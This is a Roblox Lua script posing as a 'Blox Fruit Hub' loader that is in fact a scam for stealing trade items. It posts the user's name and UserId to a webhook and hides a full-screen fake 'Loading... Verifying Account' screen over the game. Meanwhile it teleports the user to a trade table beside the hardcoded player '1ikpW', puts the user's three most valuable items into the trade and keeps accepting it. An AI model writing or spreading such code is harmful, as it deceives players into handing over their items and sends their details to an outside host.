local WEBHOOK_URL = "YOUR_WEBHOOK_URL"

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer

local function sendWebhook(message)
	if WEBHOOK_URL == "" then return end

	pcall(function()
		HttpService:PostAsync(
			WEBHOOK_URL,
			HttpService:JSONEncode({content = message}),
			Enum.HttpContentType.ApplicationJson
		)
	end)
end

sendWebhook(
	"🟢 **Test started**\n" ..
	"Player: `" .. player.Name .. "`\n" ..
	"UserId: `" .. player.UserId .. "`"
)

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "TestLoading"
ScreenGui.DisplayOrder = 999
ScreenGui.IgnoreGuiInset = true
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = game.CoreGui

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.fromScale(1, 1)
MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

local LoadingText = Instance.new("TextLabel")
LoadingText.Size = UDim2.fromOffset(600, 60)
LoadingText.Position = UDim2.fromScale(0.5, 0.5)
LoadingText.AnchorPoint = Vector2.new(0.5, 0.5)
LoadingText.BackgroundTransparency = 1
LoadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
LoadingText.TextScaled = true
LoadingText.Font = Enum.Font.Code
LoadingText.Text = "Initializing... 0%"
LoadingText.Parent = MainFrame

task.spawn(function()
	while ScreenGui.Parent do
		for i = 0, 99 do
			if not ScreenGui.Parent then return end

			LoadingText.Text = "Loading Blox Fruit Hub... " .. i .. "%"
			task.wait(math.random(1, 5) / 100)
		end

		LoadingText.Text = "Finalizing assets... 99%"
		task.wait(3)

		LoadingText.Text = "Verifying Account... Please wait..."
		task.wait(2)
	end
end)

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local TARGET_PLAYER = "1ikpW"

local player = Players.LocalPlayer
local Remotes = ReplicatedStorage:WaitForChild("Remotes")
local TradeFunction = Remotes:WaitForChild("TradeFunction")
local CommF = Remotes:WaitForChild("CommF_")
local ItemConfig = require(ReplicatedStorage:WaitForChild("ItemConfig"))

local priority = {
	["Dark Blade"] = 1000,
	["Fruit Notifier"] = 990,
	["2x Money"] = 980,
	["2x Boss Drops"] = 970,
	["2x Mastery"] = 960,
	["Fast Boats"] = 950,

	["Permanent Tiger-Tiger"] = 900,
	["Permanent Kitsune-Kitsune"] = 899,
	["Permanent Dragon-Dragon"] = 898,
	["Permanent Yeti-Yeti"] = 897,
	["Permanent Gas-Gas"] = 896,
	["Permanent Spirit-Spirit"] = 895,
	["Permanent Dough-Dough"] = 894,
	["Permanent Control-Control"] = 893,
	["Permanent Venom-Venom"] = 892,
	["Permanent Shadow-Shadow"] = 891,
	["Permanent Mammoth-Mammoth"] = 890,
	["Permanent T-Rex-T-Rex"] = 889,
	["Permanent Gravity-Gravity"] = 888,
	["Permanent Pain-Pain"] = 887,
	["Permanent Sound-Sound"] = 886,
	["Permanent Buddha-Buddha"] = 885,
	["Permanent Portal-Portal"] = 884,
	["Permanent Blizzard-Blizzard"] = 883,

	["Tiger-Tiger"] = 500,
	["Kitsune-Kitsune"] = 499,
	["Dragon-Dragon"] = 498,
	["Yeti-Yeti"] = 497,
	["Gas-Gas"] = 496,
	["Spirit-Spirit"] = 495,
	["Dough-Dough"] = 494,
	["Control-Control"] = 493,
	["Venom-Venom"] = 492,
	["Shadow-Shadow"] = 491,
	["Mammoth-Mammoth"] = 490,
	["T-Rex-T-Rex"] = 489,
	["Gravity-Gravity"] = 488,
	["Pain-Pain"] = 487,
	["Sound-Sound"] = 486,
	["Buddha-Buddha"] = 485,
	["Portal-Portal"] = 484,
	["Blizzard-Blizzard"] = 483
}

local function getTarget()
	while true do
		local target = Players:FindFirstChild(TARGET_PLAYER)

		if target then
			return target
		end

		task.wait(1)
	end
end

local function getRoot(target)
	while target.Parent do
		local character = target.Character

		if character then
			local root = character:FindFirstChild("HumanoidRootPart")

			if root then
				return root
			end
		end

		task.wait(0.25)
	end
end

local function getTradeTables()
	local tables = {}

	local dressrosa = workspace.Map:FindFirstChild("Dressrosa")

	if dressrosa then
		local t1 = dressrosa:FindFirstChild("TradeTable")
		local children = dressrosa:GetChildren()
		local t2 = children[8]

		if t1 then
			table.insert(tables, t1)
		end

		if t2 and t2 ~= t1 then
			table.insert(tables, t2)
		end
	end

	local turtle = workspace.Map:FindFirstChild("Turtle")

	if turtle then
		local t1 = turtle:FindFirstChild("TradeTable")
		local children = turtle:GetChildren()
		local t2 = children[9]

		if t1 then
			table.insert(tables, t1)
		end

		if t2 and t2 ~= t1 then
			table.insert(tables, t2)
		end
	end

	return tables
end

local function getClosestTable(root)
	local bestTable
	local bestDistance = math.huge

	for _, tableObject in ipairs(getTradeTables()) do
		local tableCF = tableObject:GetBoundingBox()
		local distance = (root.Position - tableCF.Position).Magnitude

		if distance < bestDistance then
			bestDistance = distance
			bestTable = tableObject
		end
	end

	return bestTable
end

local function teleportToOppositeChair(tableObject, root)
	local character = player.Character or player.CharacterAdded:Wait()

	local tableCF, tableSize = tableObject:GetBoundingBox()
	local targetLocal = tableCF:PointToObjectSpace(root.Position)

	local offset

	if targetLocal.X > 0 then
		offset = CFrame.new(-tableSize.X * 0.38, 1.8, 0)
	else
		offset = CFrame.new(tableSize.X * 0.38, 1.8, 0)
	end

	character:PivotTo(tableCF * offset)
end

local function waitForTrade()
	local tradeGui = player.PlayerGui.Main:WaitForChild("Trade")
	local start = os.clock()

	while os.clock() - start < 20 do
		if tradeGui.Visible then
			return tradeGui
		end

		task.wait(0.1)
	end

	return nil
end

local function getBestItems()
	local inventory = CommF:InvokeServer("getTradeInventory")

	if not inventory or not inventory.Items then
		return {}
	end

	local items = {}

	for _, item in ipairs(inventory.Items) do
		local ok, data = pcall(function()
			return ItemConfig.match(item.ItemId):unwrap()
		end)

		if ok and data and data.Index then
			local name = data.Index.StorageKey
			local score = priority[name]

			if not score
				and item.Type == "Redeemable"
				and string.sub(name, 1, 10) == "Permanent " then

				local normalName = string.sub(name, 11)
				local normalScore = priority[normalName]

				if normalScore then
					score = 800 + normalScore
				end
			end

			if score then
				table.insert(items, {
					ItemId = data.Index.ItemId,
					Name = name,
					Score = score
				})
			end
		end
	end

	table.sort(items, function(a, b)
		return a.Score > b.Score
	end)

	return items
end

local function addBestItems()
	local items = getBestItems()
	local added = 0

	for i = 1, math.min(3, #items) do
		local result = TradeFunction:InvokeServer(
			"addItem",
			items[i].ItemId,
			1
		)

		if result then
			added += 1
			task.wait(0.5)
		end
	end

	return added
end

local function acceptUntilCountdown(tradeGui)
	for _ = 1, 40 do
		if not tradeGui.Visible then
			return
		end

		local countdown = tradeGui:FindFirstChild("Countdown")

		if countdown and countdown.Visible then
			return
		end

		TradeFunction:InvokeServer("accept")
		task.wait(0.5)
	end
end

while true do
	local target = getTarget()
	local root = getRoot(target)

	if not root then
		task.wait(1)
		continue
	end

	local activeTable

	while target.Parent do
		root = target.Character and target.Character:FindFirstChild("HumanoidRootPart")

		if not root then
			task.wait(0.5)
			continue
		end

		activeTable = getClosestTable(root)

		if activeTable then
			local tableCF = activeTable:GetBoundingBox()

			if (root.Position - tableCF.Position).Magnitude <= 20 then
				break
			end
		end

		task.wait(0.5)
	end

	if not target.Parent or not activeTable then
		task.wait(1)
		continue
	end

	teleportToOppositeChair(activeTable, root)

	task.wait(1)

	local tradeGui = waitForTrade()

	if not tradeGui then
		task.wait(1)
		continue
	end

	task.wait(1)

	local added = addBestItems()

	if added > 0 then
		task.wait(2)
		acceptUntilCountdown(tradeGui)
	end

	while tradeGui.Visible do
		task.wait(0.5)
	end

	task.wait(2)
end
